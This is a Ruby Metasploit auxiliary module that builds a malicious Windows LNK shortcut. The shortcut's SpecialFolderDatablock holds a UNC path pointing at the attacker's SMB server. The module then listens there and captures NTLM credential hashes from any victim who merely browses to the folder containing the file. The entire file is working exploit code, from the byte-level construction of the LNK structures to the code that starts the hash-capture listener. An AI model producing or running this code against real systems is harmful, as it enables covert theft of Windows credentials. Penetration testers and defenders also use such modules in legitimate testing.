##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'faker'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SpecialFolderDatablock - Windows LNK File Special UNC Path NTLM Leak',
        'Description' => %q{
          This module creates a malicious Windows shortcut (LNK) file that
          specifies a special UNC path in SpecialFolderDatablock of Shell Link (.LNK)
          that can trigger an authentication attempt to a remote server. This can be used
          to harvest NTLM authentication credentials.

          When a victim browse to the location of the LNK file, it will attempt to
          connect to the the specified UNC path, resulting in an SMB connection that
          can be captured to harvest credentials.
        },
        'Author' => [ 'Nafiez' ],
        'License' => MSF_LICENSE,
        'References' => [
          [
            'URL', 'https://zeifan.my/Right-Click-LNK/',
            'EDB', '42382',
          ]
        ],
        'Platform' => 'win',
        'Targets' => [ [ 'Windows Universal', {} ] ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'DisclosureDate' => '2025-05-10' # Disclosed to MSRC on 2025-05-10
      )
    )

    register_options([
      OptString.new('APPNAME', [ false, 'Name of the application to display', nil])
    ])
  end

  def generate_shell_link_header
    header = ''
    header << [0x4C].pack('L') # HeaderSize (4 bytes)
    header << [0x00021401, 0x0000, 0x0000, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46].pack('LSSCCCCCCCC') # LinkCLSID (16 bytes)
    header << [0x81].pack('L') # LinkFlags (4 bytes): HasLinkTargetIDList + IsUnicode
    header << [0x00].pack('L') # FileAttributes (4 bytes)
    header << [0x00].pack('Q') # CreationTime (8 bytes)
    header << [0x00].pack('Q') # AccessTime (8 bytes)
    header << [0x00].pack('Q') # WriteTime (8 bytes)
    header << [0x00].pack('L') # FileSize (4 bytes)
    header << [0x00].pack('L') # IconIndex (4 bytes)
    header << [0x00].pack('L') # ShowCommand (4 bytes)
    header << [0x00].pack('S') # HotKey (2 bytes)
    header << [0x00].pack('S') # Reserved1 (2 bytes)
    header << [0x00].pack('L') # Reserved2 (4 bytes)
    header << [0x00].pack('L') # Reserved3 (4 bytes)

    header
  end

  def generate_item_id(data)
    [data.length + 2].pack('S') + data
  end

  def generate_lnk_special(path, name)
    # Force encoding to ASCII-8BIT (binary) to avoid encoding issues
    path = path.dup.force_encoding('ASCII-8BIT')
    name = name.dup.force_encoding('ASCII-8BIT')

    # Add null terminator
    path += "\x00".force_encoding('ASCII-8BIT')
    name += "\x00".force_encoding('ASCII-8BIT')

    # Convert to UTF-16LE manually
    path_utf16 = path.encode('UTF-16LE').force_encoding('ASCII-8BIT')
    name_utf16 = name.encode('UTF-16LE').force_encoding('ASCII-8BIT')

    # Remove BOM (first 2 bytes) if present
    path_utf16 = path_utf16[2..] if path_utf16.start_with?("\xFF\xFE")
    name_utf16 = name_utf16[2..] if name_utf16.start_with?("\xFF\xFE")

    bin_data = ''.force_encoding('ASCII-8BIT')
    bin_data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x00\x00\x00\x00\x00".force_encoding('ASCII-8BIT')
    bin_data << [path.length].pack('S')
    bin_data << [name.length].pack('S')
    bin_data << path_utf16
    bin_data << name_utf16
    bin_data << "\x00\x00".force_encoding('ASCII-8BIT') # comment

    bin_data
  end

  def generate_linktarget_idlist(path, name)
    idlist = ''.force_encoding('ASCII-8BIT')

    # Reference - https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html

    # First ItemID - My Computer / This PC
    # {20D04FE0-3AEA-1069-A2D8-08002B30309D}
    field_size_id1 = "\x1f\x50"
    first_id = "\xe0\x4f\xd0\x20\xea\x3a\x69\x10\xa2\xd8\x08\x00\x2b\x30\x30\x9d".force_encoding('ASCII-8BIT')
    idlist << generate_item_id(field_size_id1 + first_id)

    # Second ItemID - Control Panel (All Tasks)
    # {ED7BA470-8E54-465E-825C-99712043E01C}
    field_size_id2 = "\x2e\x80"
    second_id = "\x20\x20\xec\x21\xea\x3a\x69\x10\xa2\xdd\x08\x00\x2b\x30\x30\x9d".force_encoding('ASCII-8BIT')
    idlist << generate_item_id(field_size_id2 + second_id)

    # Custom ItemID - Our UNC path
    idlist << generate_item_id(generate_lnk_special(path, name))

    # TerminalID
    idlist << "\x00\x00".force_encoding('ASCII-8BIT')

    # Full IDList with size
    [idlist.length].pack('S') + idlist
  end

  def generate_extra_data
    extra = ''.force_encoding('ASCII-8BIT')
    extra << [0x10].pack('L')                    # BlockSize (4 bytes)
    extra << [0xA0000005].pack('L')              # SPECIAL_FOLDER_DATABLOCK_SIGNATURE (4 bytes)
    extra << [0x24].pack('L')                    # SpecialFolderID (4 bytes) - Control Panel
    extra << [0x28].pack('L')                    # Offset (4 bytes)
    extra << [0x00].pack('L')                    # TERMINAL_BLOCK (4 bytes)

    extra
  end

  def ms_shllink(path, name)
    lnk_data = ''.force_encoding('ASCII-8BIT')
    lnk_data << generate_shell_link_header
    lnk_data << generate_linktarget_idlist(path, name)
    lnk_data << generate_extra_data

    lnk_data
  end

  def run
    app_name = datastore['APPNAME']

    app_name = "#{Faker::App.name}Application" if app_name.blank?

    start_service
    unc_share = datastore['SHARE']
    unc_share = Rex::Text.rand_text_alphanumeric(6) if unc_share.blank?
    unc_path = "\\\\#{datastore['SRVHOST']}\\#{unc_share}"

    lnk_data = ms_shllink(unc_path, app_name)
    file_create(lnk_data)
    print_good("LNK file created: #{datastore['FILENAME']}")
    print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
    stime = Time.now.to_f
    timeout = datastore['ListenerTimeout'].to_i
    loop do
      break if timeout > 0 && (stime + timeout < Time.now.to_f)

      Rex::ThreadSafe.sleep(1)
    end
  end

end
